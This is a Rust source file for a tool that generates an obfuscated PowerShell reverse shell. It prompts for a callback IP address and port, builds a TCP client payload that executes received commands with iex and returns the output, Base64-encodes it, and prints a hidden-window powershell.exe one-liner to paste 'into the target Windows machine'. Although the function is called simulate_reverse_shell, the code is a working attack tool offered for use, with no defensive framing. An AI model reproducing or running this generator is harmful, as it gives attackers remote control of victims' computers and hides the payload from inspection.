use std::io::{self, Write};
use std::net::IpAddr;
use base64;

/// Obfuscates the payload with Base64 encoding
fn obfuscate_payload(payload: &str) -> String {
    base64::encode(payload)
}

/// Generates a deobfuscation PowerShell script
fn generate_powershell_command(encoded_payload: &str) -> String {
    format!(
        "powershell.exe -NoProfile -WindowStyle Hidden -Command \"[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{}')) | IEX\"",
        encoded_payload
    )
}

pub fn simulate_reverse_shell() {
    println!("Generating obfuscated reverse shell payload...");

    // Prompt for IP address
    print!("Enter the IP address to connect back to: ");
    io::stdout().flush().unwrap();
    let mut ip = String::new();
    io::stdin().read_line(&mut ip).unwrap();
    let ip = ip.trim();

    // Validate IP address
    if ip.parse::<IpAddr>().is_err() {
        eprintln!("Invalid IP address. Please enter a valid IPv4 address.");
        return;
    }

    // Prompt for port
    print!("Enter the port to connect back to: ");
    io::stdout().flush().unwrap();
    let mut port = String::new();
    io::stdin().read_line(&mut port).unwrap();

    // Validate port
    let port = match port.trim().parse::<u16>() {
        Ok(p) if (1..=65535).contains(&p) => p,
        _ => {
            eprintln!("Invalid port. Please enter a number between 1 and 65535.");
            return;
        }
    };

    // Generate the PowerShell reverse shell payload
    let ps_payload = format!(
        "$client = New-Object System.Net.Sockets.TCPClient('{}',{});$stream = $client.GetStream();[byte[]]$buffer = 0..65535 | %{{0}};while (($bytes = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {{;$data = ([System.Text.Encoding]::ASCII).GetString($buffer,0,$bytes);$response = (iex $data 2>&1 | Out-String);$response += 'PS ' + (pwd).Path + '> ';$stream.Write(([System.Text.Encoding]::ASCII).GetBytes($response), 0, $response.Length);$stream.Flush();}}",
        ip, port
    );

    // Obfuscate the payload
    let obfuscated_payload = obfuscate_payload(&ps_payload);

    // Generate the PowerShell execution command
    let ps_command = generate_powershell_command(&obfuscated_payload);

    // Output the command for manual execution
    println!("\nCopy and paste the following PowerShell command into the target Windows machine:");
    println!("{}", ps_command);
}
